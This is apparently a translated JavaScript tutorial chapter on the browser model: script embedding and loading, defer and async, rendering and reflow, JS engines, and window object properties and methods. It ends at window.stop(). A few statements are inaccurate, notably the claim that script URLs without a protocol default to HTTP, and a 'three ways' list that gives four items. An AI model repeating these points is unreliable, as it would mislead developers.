# Browser Model

## 1. Browser Environment Overview

**JavaScript is the built-in scripting language of browsers**. In other words, browsers ship with a JavaScript engine and provide various interfaces that allow JavaScript scripts to control browser functionality. Once JavaScript is embedded in a web page, the browser executes the script when loading the page, enabling all kinds of dynamic effects.

This chapter introduces the various JavaScript interfaces provided by browsers. First, let's look at how to embed JavaScript code in a web page.

### 1. Methods of Embedding Code in a Web Page

There are primarily three ways to embed JavaScript code in a web page.

- The `  <script>  ` element with code embedded directly.
- The `  <script>  ` tag loading an external script.
- Event attributes.
- The URL protocol.



#### 1.1 Embedding code with the script element

You can write JavaScript code directly inside a `  <script>  ` element.

```html
<script>
  var x = 1 + 5;
  console.log(x);
</script>
```

The `  <script>  ` tag has a `type` attribute that specifies the script type. For JavaScript scripts, the `type` attribute can take two values.

- `text/javascript`: This is the default value, and it is the value that has historically always been used. If you omit the `type` attribute, this is the default. For older browsers, it is better to use this value.
- `application/javascript`: For newer browsers, it is recommended to use this value.

```html
<script type="application/javascript">
  console.log('Hello World');
</script>
```

Since the `  <script>  ` tag defaults to JavaScript code, the `type` attribute can be omitted when embedding a JavaScript script.

If the browser does not recognize the value of the `type` attribute, it will not execute the code inside. Taking advantage of this, you can embed arbitrary text content inside a `  <script>  ` tag, simply by adding a `type` attribute the browser does not recognize.

```html
<script id="mydata" type="x-custom-data">
  console.log('Hello World');
</script>
```

The browser will not execute the code above, nor display its content, because it does not recognize the `type` attribute. However, this `  <script>  ` node still exists in the DOM, and you can read its content using the `text` property of the `  <script>  ` node.

```js
document.getElementById('mydata').text
//   console.log('Hello World');
```



#### 1.2 Loading external scripts with the script element

The `<script>` tag can also be used to load an external script file.

```html
<script src="https://www.example.com/script.js"></script>
```

If the script file uses non-English characters, you should also specify the character encoding.

```html
<script charset="utf-8" src="https://www.example.com/script.js"></script>
```

The loaded script must be pure JavaScript code; it cannot contain `HTML` code or `  <script>  ` tags.

**Loading an external script and adding a code block directly cannot be mixed**. The `console.log` statement in the code below is simply ignored.

```html
<script charset="utf-8" src="example.js">
  console.log('Hello World!'); // ignored
</script>
```

To prevent attackers from tampering with the external script, the `script` tag allows setting an `integrity` attribute, into which you write the hash signature of the external script, used to verify the script's integrity.

```html
<script src="/assets/application.js"
  integrity="sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=">
</script>
```

In the code above, the `script` tag has an `integrity` attribute that specifies the SHA256 signature of the external script `/assets/application.js`. Once someone modifies this script and the SHA256 signature no longer matches, the browser will refuse to load it.



#### 1.3 Event attributes

The event attributes of web page elements (such as `onclick` and `onmouseover`) can contain JavaScript code. When the specified event occurs, this code is called.

```html
<button id="myBtn" onclick="console.log(this.id)">Click</button>
```

The event attribute code above contains only one statement. If there are multiple statements, just separate them with semicolons.



#### 1.4 The URL protocol

URLs support the `javascript:` protocol, that is, writing code in the URL position; when this URL is used, the JavaScript code is executed.

```html
<a href="javascript:console.log('Hello')">Click</a>
```

The browser's address bar can also execute the `javascript:` protocol. If you put `javascript:console.log('Hello')` in the address bar and press Enter, this code will also run.

If the JavaScript code returns a string, the browser will create a new document and display the content of this string; the content of the original document will disappear.

```html
<a href="javascript: new Date().toLocaleTimeString();">Click</a>
```

In the code above, after the user clicks the link, a new document opens containing the current time.

If the return value is not a string, then the browser will neither create a new document nor navigate.

```html
<a href="javascript: console.log(new Date().toLocaleTimeString())">Click</a>
```

In the code above, after the user clicks the link, the page will not navigate; it only displays the current time in the console.

A common use of the `javascript:` protocol is the bookmarklet. Since a browser bookmark stores a URL, a `javascript:` URL can also be stored in it. When the user selects this bookmark, the script is executed on the current page. To prevent the bookmark from replacing the current document, you can prepend `void` to the script, or append `void 0` at the end of the script.

```html
<a href="javascript: void new Date().toLocaleTimeString();">Click</a>
<a href="javascript: new Date().toLocaleTimeString();void 0;">Click</a>
```

With both of these forms, clicking the link will execute the code without navigating the page.





### 2. The script element

#### 2.1 How it works

The browser loads JavaScript scripts mainly through the `  <script>  ` element. The normal page loading process is as follows.

1. The browser downloads the HTML page while parsing it. In other words, it does not wait until the download is complete before starting to parse.
2. During parsing, when the browser encounters a `  <script>  ` element, it pauses parsing and hands control of page rendering over to the JavaScript engine.
3. If the `  <script>  ` element references an external script, that script is downloaded and then executed; otherwise the code is executed directly.
4. Once the JavaScript engine finishes executing, control is returned to the rendering engine, which resumes parsing the rest of the HTML page.

When loading an external script, the browser pauses page rendering, waits for the script to download and finish executing, and only then continues rendering. The reason is that JavaScript code can modify the DOM, so control must be handed over to it; otherwise complex thread-race problems would arise.

If an external script takes a long time to load (and the download never completes), then the browser will keep waiting for the script to finish downloading, causing the page to become unresponsive for a long time. The browser will appear to be in a "frozen" state; this is called the "blocking effect."

To avoid this situation, the better practice is to **place all `  <script>  ` tags at the bottom of the page rather than in the head**. This way, even if a script becomes unresponsive, the rendering of the page body has already completed, so the user can at least see the content rather than facing a blank page. If some script code is very important and must be placed in the head of the page, it is best to write the code directly into the page rather than linking an external script file, which shortens loading time.

There is another benefit to loading all script files at the end of the page. Because calling a DOM node before the DOM structure has been generated causes JavaScript to throw an error, this problem does not occur if all scripts are loaded at the end of the page, since at that point the DOM has definitely been generated.

```html
<head>
  <script>
    console.log(document.body.innerHTML);
  </script>
</head>
<body>
</body>
```

The code above will throw an error when executed, because at this point the `document.body` element has not yet been generated.

One solution is to set a callback function for the `DOMContentLoaded` event.

```html
<head>
  <script>
    document.addEventListener(
      'DOMContentLoaded',
      function (event) {
        console.log(document.body.innerHTML);
      }
    );
  </script>
</head>
```

In the code above, the relevant code only starts executing after the `DOMContentLoaded` event occurs. The `DOMContentLoaded` event is only triggered after the DOM structure has been generated.

Another solution is to use the `onload` attribute of the `  <script>  ` tag. When the external script file specified by the `  <script>  ` tag finishes downloading and parsing, a `load` event is triggered, and you can put the code you need to execute inside this event's callback function.

```html
<script src="jquery.min.js" onload="console.log(document.body.innerHTML)">
</script>
```

However, if you place the script at the bottom of the page, you can write it in the completely normal way, and neither of the two approaches above is needed.

```html
<body>
  <!-- other code  -->
  <script>
    console.log(document.body.innerHTML);
  </script>
</body>
```

If there are multiple `script` tags, for example like the following.

```html
<script src="a.js"></script>
<script src="b.js"></script>
```

The browser downloads `a.js` and `b.js` in parallel at the same time, but during execution it guarantees that `a.js` is executed first and then `b.js`, even if the latter finishes downloading first. In other words, the execution order of scripts is determined by the order in which they appear on the page; this is to ensure that the dependency relationships between scripts are not broken. Of course, loading both scripts produces a "blocking effect": the browser will not continue page rendering until they have both finished loading.

Parsing and executing CSS also produces blocking. Firefox waits until all the stylesheets before the script have been downloaded and parsed before executing the script; Webkit, on the other hand, pauses script execution as soon as it finds that the script references a style, and resumes execution after the stylesheet has been downloaded and parsed.

In addition, for resources from the same domain, such as script files, stylesheet files, image files, etc., browsers generally have a limit, downloading at most 6 to 20 resources simultaneously, that is, there is a limit on the maximum number of TCP connections opened simultaneously, in order to prevent placing too much pressure on the server. For resources from different domains, there is no such limit. Therefore, **static files are usually placed under different domains to speed up downloading**.



#### 2.2 The defer attribute (deferring execution of external JS)

To solve the problem of script file downloads blocking page rendering, one method is to add the `defer` attribute to the `  <script>  ` element. Its **function is to delay the execution of the script, executing the script only after the DOM has finished loading and been generated**.

```html
<script src="a.js" defer></script>
<script src="b.js" defer></script>
```

In the code above, `a.js` and `b.js` are only executed after the DOM has finished loading.

The execution flow of the `defer` attribute is as follows.

1. The browser starts parsing the HTML page.
2. During parsing, it encounters a `  <script>  ` element with the `defer` attribute.
3. The browser continues parsing the HTML page while downloading the external script loaded by the `  <script>  ` element in parallel.
4. The browser finishes parsing the HTML page, and at this point goes back to execute the scripts that have already finished downloading.

With the `defer` attribute, when the browser downloads the script file, it does not block page rendering. The downloaded script file is executed before the `DOMContentLoaded` event is triggered (that is, just after reading the ` </html> ` tag), and the execution order is guaranteed to be the order in which they appear on the page.

The `defer` attribute has no effect on inline `script` tags (rather than those loading external scripts), nor on dynamically generated `script` tags. In addition, external scripts loaded with `defer` should not use the `document.write` method.



#### 2.3 The async attribute (asynchronously executing external JS)

Another method to solve the "blocking effect" is to add the `async` attribute to the ` <script>` element.

```html
<script src="a.js" async></script>
<script src="b.js" async></script>
```

The function of the `async` attribute is to **download the script using another process; the download does not block rendering**.

1. The browser starts parsing the HTML page.
2. During parsing, it encounters a `script` tag with the `async` attribute.
3. The browser continues parsing the HTML page while downloading the external script in the ` <script>` tag in parallel.
4. When the script finishes downloading, the browser pauses parsing the HTML page and starts executing the downloaded script.
5. After the script finishes executing, the browser resumes parsing the HTML page.

The `async` attribute guarantees that the browser continues rendering while the script is downloading. Note that once this attribute is used, **the execution order of the scripts cannot be guaranteed**. Whichever script finishes downloading first is executed first. In addition, the code inside a script file using the `async` attribute should not use the `document.write` method.

So which one should you actually use, the `defer` attribute or the `async` attribute?

**Generally speaking, if there are no dependencies between the scripts, use the `async` attribute; if there are dependencies between the scripts, use the `defer` attribute**. If both the `async` and `defer` attributes are used at the same time, the latter has no effect, and the browser behavior is determined by the `async` attribute.



#### 2.4 Dynamic loading of scripts (createElement script)

The `<script>` element can also be generated dynamically and then inserted into the page, thereby achieving dynamic loading of scripts.

```js
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  document.head.appendChild(script);
});
```

The benefit of this approach is that the dynamically generated `script` tag does not block page rendering, and therefore does not cause the browser to freeze. But the problem is that this approach cannot guarantee the execution order of the scripts; whichever script file finishes downloading first is executed first.

If you want to avoid this problem, you can set the `async` attribute to `false`.

```js
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  script.async = false;
  document.head.appendChild(script);
});
```

The code above does not block page rendering, and guarantees that `b.js` is executed after `a.js`. Note, however, that script files loaded after this code will therefore all wait until `b.js` has finished executing before they execute.

If you want to specify a callback function for a dynamically loaded script, you can use the following form.

```js
function loadScript(src, done) {
  var js = document.createElement('script');
  js.src = src;
  js.onload = function() {
    done();
  };
  js.onerror = function() {
    done(new Error('Failed to load script ' + src));
  };
  document.head.appendChild(js);
}
```



#### 2.5 The protocol used for loading (http or https)

If no protocol is specified, the browser downloads using the HTTP protocol by default.

```html
<script src="example.js"></script>
```

The `example.js` above is downloaded using the HTTP protocol by default; if you want to download using the HTTPS protocol, you must specify it explicitly.

```html
<script src="https://example.js"></script>
```

But sometimes we want the loading protocol to be determined by the page's own protocol; in that case, we can use the following form.

```html
<script src="//example.js"></script>
```



### 3. Components of the browser

The core of a browser consists of two parts: the **rendering engine** and the **JavaScript interpreter (also known as the JavaScript engine)**.

#### 3.2 The rendering engine

The main function of the rendering engine is to **render the web page code into a flat document that the user can visually perceive**.

Different browsers have different rendering engines.

- Firefox: the Gecko engine
- Safari: the WebKit engine
- Chrome: the Blink engine
- IE: the Trident engine
- Edge: the EdgeHTML engine

The rendering engine processes a web page typically in four stages.

1. Parse the code: HTML code is parsed into the DOM, and CSS code is parsed into the CSSOM (CSS Object Model).
2. Object synthesis: combine the DOM and CSSOM into a render tree.
3. Layout: compute the layout of the render tree.
4. Paint: paint the render tree onto the screen.

The four steps above are not executed strictly in order; often the first step has not yet completed when the second and third steps have already begun. So you will see this situation: the HTML code of the page has not finished downloading, but the browser has already displayed some content.



#### 3.2 Reflow and repaint

**Converting the render tree into the page layout is called "layout flow" (flow); the process of displaying the layout on the page is called "paint" (paint)**. Both have a blocking effect and consume a lot of time and computational resources.

```` markdown
```mermaid
graph LR
    1(Render tree) -- layout flow --> 2(Page layout)
    2 --paint--> 3(Page display)
```
````

**Once the page has been generated, both script operations and stylesheet operations will trigger "reflow" and "repaint"**.

**User interactions will also trigger reflow and repaint, such as setting a mouse hover (`a:hover`) effect, page scrolling, entering text into an input box, resizing the window, and so on.**

Reflow and repaint do not necessarily happen together. A reflow inevitably causes a repaint, but a repaint does not necessarily require a reflow. For example, changing the color of an element only causes a repaint, not a reflow; changing the layout of an element causes both a repaint and a reflow.

In most cases, the browser will intelligently determine to limit reflow and repaint only to the relevant subtree, minimizing the cost incurred, rather than regenerating the entire page.

As a developer, you should try your best to reduce the number and cost of repaints. For example, try not to modify high-level DOM elements, and instead replace them with modifications to low-level DOM elements; and as another example, repainting `table` layouts and `flex` layouts is relatively expensive.

```js
var foo = document.getElementById('foobar');

foo.style.color = 'blue';
foo.style.marginTop = '30px';
```

The code above will only cause one repaint, because the browser accumulates DOM changes and then executes them all at once.

Below are some **optimization tips**.

- When reading from the DOM or writing to the DOM, try to group operations together and not mix them. Do not read a DOM node, then immediately write, and then read another DOM node.
- Cache DOM information.
- Do not change styles one by one; instead change styles all at once using a CSS class.
- Use `documentFragment` to manipulate the DOM.
- Use `absolute` or `fixed` positioning for animations, which can reduce the impact on other elements.
- Only show hidden elements when necessary.
- Use `window.requestAnimationFrame()`, because it can defer code to be executed at the next reflow rather than immediately requesting a page reflow.
- Use a virtual DOM library.

Below is an example comparing the effect of `window.requestAnimationFrame()`.

```js
// high repaint cost
function doubleHeight(element) {
  var currentHeight = element.clientHeight;
  element.style.height = (currentHeight * 2) + 'px';
}

all_my_elements.forEach(doubleHeight);

// low repaint cost
function doubleHeight(element) {
  var currentHeight = element.clientHeight;

  window.requestAnimationFrame(function () {
    element.style.height = (currentHeight * 2) + 'px';
  });
}

all_my_elements.forEach(doubleHeight);
```

In the first block of code above, each time the DOM is read, a new value is written, causing constant reflow and re-layout. The second block of code accumulates all the write operations together, thereby minimizing the cost of DOM code changes.



#### 3.3 The JavaScript engine

The main function of the JavaScript engine is to read the JavaScript code in a web page, process it, and run it.

JavaScript is an interpreted language, which means it does not need to be compiled and is run in real time by an interpreter. The benefit of this is that running and modifying are relatively convenient; you can re-interpret simply by refreshing the page. The drawback is that the interpreter must be invoked on every run, incurring significant system overhead, and running speed is slower than compiled languages.

To improve running speed, current browsers compile JavaScript to a certain degree, generating intermediate code similar to bytecode, in order to improve running speed.

In the early days, the browser's internal processing of JavaScript was as follows:

1. Read the code and perform lexical analysis, breaking the code down into tokens.
2. Perform syntactic analysis (parsing) on the tokens, organizing the code into a "syntax tree."
3. Use a "translator" to convert the code into bytecode.
4. Use a "bytecode interpreter" to convert the bytecode into machine code.

Interpreting line by line to convert bytecode into machine code is very inefficient. To improve running speed, modern browsers instead adopt "Just In Time compilation" (Just In Time compiler, abbreviated JIT), that is, the bytecode is compiled only at run time, compiling whichever line is needed when it is needed, and caching the compilation result (inline cache). Usually, only a small part of a program's code is frequently used, and with cached compilation results, the running speed of the entire program will improve significantly.

Bytecode cannot run directly; instead it runs on top of a virtual machine (Virtual Machine), and the virtual machine is also generally called the JavaScript engine. Not all JavaScript virtual machines have bytecode at run time; some JavaScript virtual machines are based on source code, that is, whenever possible, they directly compile the source code into machine code to run via a JIT (just in time) compiler, skipping the bytecode step. This differs from other languages that use virtual machines (such as Java). The purpose of doing this is to optimize the code and improve performance as much as possible. Below are some of the most common JavaScript virtual machines today:

- [Chakra](https://en.wikipedia.org/wiki/Chakra_(JScript_engine)) (Microsoft Internet Explorer)
- [Nitro/JavaScript Core](https://en.wikipedia.org/wiki/WebKit#JavaScriptCore) (Safari)
- [Carakan](https://dev.opera.com/articles/view/labs-carakan/) (Opera)
- [SpiderMonkey](https://developer.mozilla.org/en-US/docs/SpiderMonkey) (Firefox)
- [V8](https://en.wikipedia.org/wiki/Chrome_V8) (Chrome, Chromium)



## 2. The window Object

### 1. Overview

In the browser, the `window` object (note that `w` is lowercase) **refers to the current browser window. It is also the top-level object of the current page**, that is, the highest-level object, and all other objects are subordinate to it. If a variable is undeclared, it is by default a property of the top-level object.

```js
a = 1;
window.a // 1
```

In the code above, `a` is a variable that is assigned a value directly without being declared, and it automatically becomes a property of the top-level object.

`window` has its own concrete meaning, and is actually not suitable to serve as the highest-level top-level object; this is a design mistake of the language. Originally, when the language was designed, the initial idea was that the fewer objects built into the language, the better, as this could improve browser performance. Therefore, the language designer Brendan Eich made the `window` object the top-level object, and all variables assigned without being declared automatically become properties of the `window` object. This design makes it impossible to detect undeclared variables at compile time, but by now there is no way to correct it.



### 2. Properties of the window object

#### 2.1 window.name: the name of the browser window, defaults to an empty string

The `window.name` property is a string representing the name of the current browser window. A window does not necessarily need a name; this property is mainly used in conjunction with the `target` attribute of hyperlinks and forms.

```js
window.name = 'Hello World!';
console.log(window.name)
// "Hello World!"
```

This property can only store strings; if the value written is not a string, it is automatically converted to a string. Different browsers vary in the storage capacity of this value, but generally speaking it can be as high as several MB.

As long as the browser window is not closed, this property does not disappear. For example, when visiting `a.com`, the page's script sets `window.name`, and next, when `b.com` is loaded in the same window, the new page's script can read the `window.name` set by the previous page. The same is true on page refresh. Once the browser window is closed, the value stored in this property disappears, because at that point the window no longer exists.

> Note: This property is defined on the browser window object `window`, and has nothing to do with the site being visited. That is, once this property is defined, it still exists when you visit other sites.



#### 2.2 window.closed: whether the window is closed; window.opener: the parent window object that opened the current window

The `window.closed` property returns a boolean value indicating **whether the window is closed**.

```js
window.closed // false
```

The code above checks whether the current window is closed. Such a check is not very meaningful, because as long as the code can run, the current window is certainly not closed. **This property is generally used to check whether a new window opened with a script is closed.**

```js
var popup = window.open();

if ((popup !== null) && !popup.closed) {
  // the window is still open
}
```

The `window.opener` property represents **the parent window object that opened the current window**. If the current window has no parent window (that is, it was opened directly by entering the address in the address bar), it returns `null`.

```js
window.open().opener === window // true
```

The expression above opens a new window and then returns `true`.

If the two windows do not need to communicate, it is recommended to explicitly set the child window's `opener` property to `null`, which can reduce some security risks.

```js
var newWin = window.open('example.html', 'newWindow', 'height=400,width=400');
newWin.opener = null;
```

In the code above, with the child window's `opener` property set to `null`, the two windows can no longer communicate.

**Through the `opener` property, you can obtain the global properties and methods of the parent window, but only when the two windows are same-origin (see the chapter "Same-Origin Policy") and one of the windows was opened by the other**. Adding the `rel="noopener"` attribute to an `  <a>  ` element can prevent the newly opened window from obtaining the parent window, reducing the risk of a malicious site modifying the parent window's URL.

```html
<a href="https://an.evil.site" target="_blank" rel="noopener">
Malicious site
</a>
```



#### 2.3 window.self and window.window both point to the window itself, read-only

The `window.self` and `window.window` properties both **point to the window itself**. Both properties are **read-only**.

```js
window.self === window // true
window.window === window // true
```



#### 2.4 window.frames: an array-like collection of (i)frames; window.length returns the total number of (i)frames

The `window.frames` property **returns an array-like object whose members are all the frame windows within the page, including `frame` elements and `iframe` elements**. `window.frames[0]` represents the first frame window in the page.

If an `iframe` element has an `id` or `name` attribute set, then you can use the attribute value to reference this `iframe` window. For example, `  <iframe name="myIFrame">  ` can be referenced using `frames['myIFrame']` or `frames.myIFrame`.

The `frames` property is actually an alias of the `window` object.

```js
frames === window // true
```

Therefore, `frames[0]` can also be written as `window[0]`. However, semantically, `frames` is clearer, and considering that `window` is also the global object, it is recommended to always use the `frames[0]` form when referring to multiple windows. For more information, see the "Multi-window operations" section below.

The `window.length` property **returns the total number of frames contained in the current page**. If the current page contains no `frame` or `iframe` elements, then `window.length` returns `0`.

```js
window.frames.length === window.length // true
```

The code above shows that `window.frames.length` and `window.length` should be equal.



#### 2.5 window.frameElement: the frame element

The `window.frameElement` property is **mainly used in the case where the current window is embedded in another page** (embedded in an ` <object> `, `  <iframe>  `, or ` <embed> ` element), and **returns the element node in which the current window resides**. If the current window is the top-level window, or the embedding page is not same-origin, this property returns `null`.

```js
// HTML code as follows
// <iframe src="about.html"></iframe>

// the following script is inside about.html
var frameEl = window.frameElement;
if (frameEl) {
  frameEl.src = 'other.html';
}
```

In the code above, the `frameEl` variable is the `  <iframe>  ` element.



#### 2.6 window.top: the top-level window; window.parent: the parent window

The `window.top` property **points to the topmost window**, and is mainly used to obtain the top-level window from within a frame window.

The `window.parent` property **points to the parent window**. If the current window has no parent window, `window.parent` points to itself.

```js
if (window.parent !== window.top) {
  // indicates that the current window is embedded more than one level deep
}
```

For pages that do not contain frames, these two properties are equivalent to the `window` object.



#### 2.7 window.status: read/write the status bar text

The `window.status` property is **used to read and write the text of the browser status bar**. However, many browsers now do not allow overwriting the status bar text, so using this method may not be effective.



#### 2.8 window.devicePixelRatio: the ratio of CSS pixels to physical pixels

The `window.devicePixelRatio` property **returns a number representing the ratio between the size of one CSS pixel and the size of one physical pixel**. In other words, it indicates how many physical pixels make up one CSS pixel. It can be used to determine the user's display environment; if this ratio is large, it indicates that the user is using a high-resolution screen, so larger-pixel images can be displayed.



#### 2.9 Position and size properties

##### (1) window.screenX, window.screenY: the X and Y distance of the window from the top-left corner of the screen

The `window.screenX` and `window.screenY` properties **return the horizontal distance and vertical distance of the top-left corner of the browser window relative to the top-left corner of the current screen (in pixels)**. Both properties are **read-only**.



##### (2) window.innerHeight, window.innerWidth: the width and height of the viewport

The `window.innerHeight` and `window.innerWidth` properties return **the height and width of the visible part of the page in the current window, that is, the size of the "viewport" (in pixels)**. Both properties are **read-only**.

When the user zooms in on the page (for example, enlarging the page from 100% to 200%), these two properties become smaller. This is because at this point the page's pixel size does not change (for example, the width is still 960 pixels); only the screen space occupied by each pixel becomes larger, so the visible part (viewport) becomes smaller.

Note that these two property values include the height and width of the scrollbar.



##### (3) window.outerHeight, window.outerWidth: the overall window width and height

The `window.outerHeight` and `window.outerWidth` properties **return the height and width of the browser window, including the browser menu and borders (in pixels)**. Both properties are **read-only**.



##### (4) window.scrollX, window.scrollY: the horizontal/vertical scroll distance of the window

The `window.scrollX` property **returns the horizontal scroll distance of the page**, and the `window.scrollY` property **returns the vertical scroll distance of the page**, both in pixels. Both properties are **read-only**.

Note that the return values of these two properties are not integers but double-precision floating-point numbers. If the page has not scrolled, their values are `0`.

For example, if the user drags the vertical scrollbar down by 75 pixels, then `window.scrollY` is about 75. If the user drags the horizontal scrollbar 200 pixels to the right, `window.scrollX` is about 200.

```js
if (window.scrollY < 75) {
  window.scroll(0, 75);
}
```

In the code above, if the distance the page has scrolled down is less than 75 pixels, then the page scrolls down by 75 pixels.



##### (5) window.pageXOffset, window.pageYOffset: aliases, same as (4)

The `window.pageXOffset` and `window.pageYOffset` properties are aliases of `window.scrollX` and `window.scrollY`.



#### 2.10 Component properties (the browser's component objects, such as the address bar, etc.)

Component properties **return the browser's component objects**. There are several such properties below.

- `window.locationbar`: the address bar object
- `window.menubar`: the menu bar object
- `window.scrollbars`: the window's scrollbar object
- `window.toolbar`: the toolbar object
- `window.statusbar`: the status bar object
- `window.personalbar`: the personal toolbar object installed by the user

The `visible` property of these objects is a boolean value indicating **whether these components are visible**. These properties are **read-only**.

```js
window.locationbar.visible
window.menubar.visible
window.scrollbars.visible
window.toolbar.visible
window.statusbar.visible
window.personalbar.visible
```



#### 2.11 Global object properties

The global object properties point to some of the browser's native global objects.

- `window.document`: points to the `document` object, see the chapter "The document Object" for details. Note that this property has a same-origin restriction. Only scripts from the same origin can read this property. **[document object]**
- `window.location`: points to the `Location` object, used to obtain the URL information of the current window. It is equivalent to the `document.location` property, see the chapter "The Location Object" for details. **[URL information object]**
- `window.navigator`: points to the `Navigator` object, used to **obtain environment information**, see the chapter "The Navigator Object" for details.
- `window.history`: points to the `History` object, representing the browser's **browsing history**, see the chapter "The History Object" for details.
- `window.localStorage`: points to the **locally stored localStorage data**, see the chapter "The Storage Interface" for details.
- `window.sessionStorage`: points to the **locally stored sessionStorage data**, see the chapter "The Storage Interface" for details.
- `window.console`: points to the `console` object, used to **operate the console**, see the chapter "The console Object" for details.
- `window.screen`: points to the `Screen` object, representing **screen information**, see the chapter "The Screen Object" for details.



#### 2.12 window.isSecureContext: whether in a secure context, true for the HTTPS protocol

The `window.isSecureContext` property returns a boolean value indicating whether the current window is in a secure context. If it is the HTTPS protocol, it is `true`; otherwise it is `false`.



### 3. Methods of the window object

#### 3.1 window.alert(), window.prompt(), window.confirm()

`window.alert()`, `window.prompt()`, and `window.confirm()` are all global methods for the browser to interact with the user. They pop up different dialog boxes asking the user to respond. Note that the dialog boxes popped up by these three methods all use the uniform style defined by the browser and cannot be customized.

**(1) window.alert() dialog box**

The `window.alert()` method **pops up a dialog box with only one "OK" button**, and is often used to notify the user of some information.

```js
window.alert('Hello World');
```

The dialog box disappears only when the user clicks the "OK" button. While the dialog box is open, the browser window is in a frozen state, and if the user does not click the "OK" button, they cannot do anything.

The argument of the `window.alert()` method can only be a string, and CSS styles cannot be used, but you can use `\n` to specify a line break.

```js
alert('This message\nis split into two lines');
```

**(2) window.prompt() dialog box, returns the input value**

The `window.prompt()` method **pops up a dialog box that, below the prompt text, also has an input box asking the user to enter information, with two buttons, "OK" and "Cancel". It is often used to obtain data entered by the user**.

```js
var result = prompt('Your age?', 25) // pops up a dialog input box containing the prompt text and the default pre-entered text '25'; after confirming, the value is returned to result
```

The code above pops up a dialog box with the text prompt "Your age?", asking the user to enter their age in the dialog box (defaulting to 25). The value the user fills in is stored as the return value in the variable `result`.

The return value of `window.prompt()` has two possibilities: it may be a string (possibly an empty string), or it may be `null`. Specifically, there are three cases.

1. The user enters information and clicks "OK", in which case the information entered by the user is the return value.
2. The user enters no information and directly clicks "OK", in which case the default value of the input box is the return value.
3. The user clicks "Cancel" (or presses the ESC key), in which case the return value is `null`.

The second argument of the `window.prompt()` method is optional, but it is best to always provide the second argument as the default value of the input box.

**(3) window.confirm() dialog box, returns a boolean value**

The dialog box popped up by the `window.confirm()` method, besides the prompt information, has only two buttons, "OK" and "Cancel", and is often used to ask the user whether they agree.

```js
var result = confirm('How have you been lately?');
```

The code above pops up a dialog box with only one line of text "How have you been lately?", and the user chooses to click "OK" or "Cancel".

The `confirm` method **returns a boolean value: if the user clicks "OK", it returns `true`; if the user clicks "Cancel", it returns `false`.**

```js
var okay = confirm('Please confirm this message.');
if (okay) {
  // user pressed "OK"
} else {
  // user pressed "Cancel"
}
```

One use of `confirm` is to pop up a dialog box when the user leaves the current page, asking the user whether they really want to leave.

```js
window.onunload = function () {
  return window.confirm('Are you sure you want to leave this page?');
}
```

All three of these methods have a blocking effect: once the dialog box pops up, the entire page pauses execution, waiting for the user to respond.



#### 3.2 window.open(), window.close(), window.stop()

**(1) window.open() opens a new window**

The `window.open` method is used to **create another browser window**, similar to the browser menu's new window option. It returns a reference to the new window, or `null` if the window cannot be created.

```js
var popup = window.open('somefile.html');
```

The code above makes the browser pop up a new window whose URL is `somefile.html` under the current domain.

The `open` method can accept a total of three arguments.

```js
window.open(url, windowName, [windowFeatures])
```

- `url`: a string representing the URL of the new window. If omitted, the default URL is `about:blank`.
- `windowName`: a string representing the name of the new window. If a window with that name already exists, that window is reused instead of creating a new one. If omitted, the default is `_blank`, which means creating a new window with no name. There are also several preset values: `_self` means the current window, `_top` means the top-level window, and `_parent` means the parent window.
- `windowFeatures`: a string whose content is comma-separated key-value pairs (see below for details), representing the parameters of the new window, such as whether there is a prompt bar, toolbar, and so on. If omitted, a new window with a complete UI is opened by default. If an already-existing window is reused, this argument has no effect, and the browser keeps the parameters of the previous window.

Below is an example.

```js
var popup = window.open(
  'somepage.html',
  'DefinitionsWindows',
  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
);
```

The code above indicates that the new window opened has a height and width of 200 pixels, no address bar, but has a status bar and scrollbars, and allows the user to resize it.

The third argument can set the following properties.

- left: the distance of the new window from the leftmost edge of the screen (in pixels). Note that the new window must be visible and cannot be placed off-screen.
- top: the distance of the new window from the topmost edge of the screen (in pixels).
- height: the height of the new window's content area (in pixels), must not be less than 100.
- width: the width of the new window's content area (in pixels), must not be less than 100.
- outerHeight: the height of the entire browser window (in pixels), must not be less than 100.
- outerWidth: the width of the entire browser window (in pixels), must not be less than 100.
- menubar: whether to display the menu bar.
- toolbar: whether to display the toolbar.
- location: whether to display the address bar.
- personalbar: whether to display the user's own installed toolbar.
- status: whether to display the status bar.
- dependent: whether it depends on the parent window. If it depends, then when the parent window is minimized, this window is also minimized; when the parent window is closed, this window is also closed.
- minimizable: whether there is a minimize button, on the condition that `dialog=yes`.
- noopener: the new window will be cut off from the parent window, that is, the new window's `window.opener` property returns `null`, and the parent window's `window.open()` method also returns `null`.
- resizable: whether the new window can be resized.
- scrollbars: whether scrollbars are allowed to appear in the new window.
- dialog: whether the new window's title bar shows the maximize, minimize, and restore-original-size controls.
- titlebar: whether the new window displays a title bar.
- alwaysRaised: whether to display on top of all windows.
- alwaysLowered: whether to display beneath the parent window.
- close: whether the new window displays a close button.

For those properties that can be turned on and off, setting them to `yes` or `1` or setting no value indicates on; for example, `status=yes`, `status=1`, and `status` all produce the same result. If you want to turn one off, you do not write `no`, but simply omit the property. In other words, if you set some properties in the third argument, all other `yes/no` properties that are not set will be set to `no`, with the exception of `titlebar` and the close button (their values default to `yes`).

For the above properties, the property name and property value are connected with an equals sign, and properties are separated by commas.

```js
'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
```

In addition, although the second argument of the `open()` method can specify an already-existing window, this is not the same as being able to arbitrarily control other windows. To prevent being controlled by an unrelated window, the browser only allows the `open` method to point to a window when the two windows are same-origin, or the target window was opened by the current page.

The `window.open` method returns a reference to the new window.

```js
var windowB = window.open('windowB.html', 'WindowB');
windowB.window.name // "WindowB"
```

Note that if the new window and the parent window are not same-origin (that is, not in the same domain), they cannot obtain each other's internal window object properties.

Below is another example.

```js
var w = window.open();
console.log('a new window has been opened');
w.location = 'http://example.com';
```

The code above first opens a new window, then directs the URL of that window to `example.com`.

Since the `open` method is easily abused, many browsers do not allow scripts to automatically create new windows by default. They only allow scripts to respond and pop up a new window when the user clicks a link or button. Therefore, it is necessary to check whether opening the new window succeeded.

```js
var popup = window.open();
if (popup === null) {
  // failed to create the new window
}
```

**(2) window.close() closes the current window**

The `window.close` method is used to **close the current window**, and is **generally only used to close windows created by the `window.open` method.**

```js
popup.close()
```

This method is only effective for top-level windows; using this method on a window inside an `iframe` frame has no effect.

**(3) window.stop() stops loading the page**

